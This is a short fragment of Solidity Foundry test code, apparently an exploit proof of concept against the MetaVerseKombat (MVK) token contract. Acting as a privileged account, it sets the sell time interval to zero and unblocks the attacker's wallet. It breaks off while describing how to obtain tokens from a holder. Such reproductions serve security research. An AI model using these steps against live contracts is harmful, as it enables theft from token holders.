        // Set sell time interval to 0 so we can sell immediately
        IMetaVerseKombat(TARGET).set_sellTimeInterval(0);

        // Unblock our address if needed
        IMetaVerseKombat(TARGET).unblockWalletAddress(address(this));

        vm.stopPrank();

        // Get some MVK tokens to the attacker
        // First, find a holder (likely the owner)
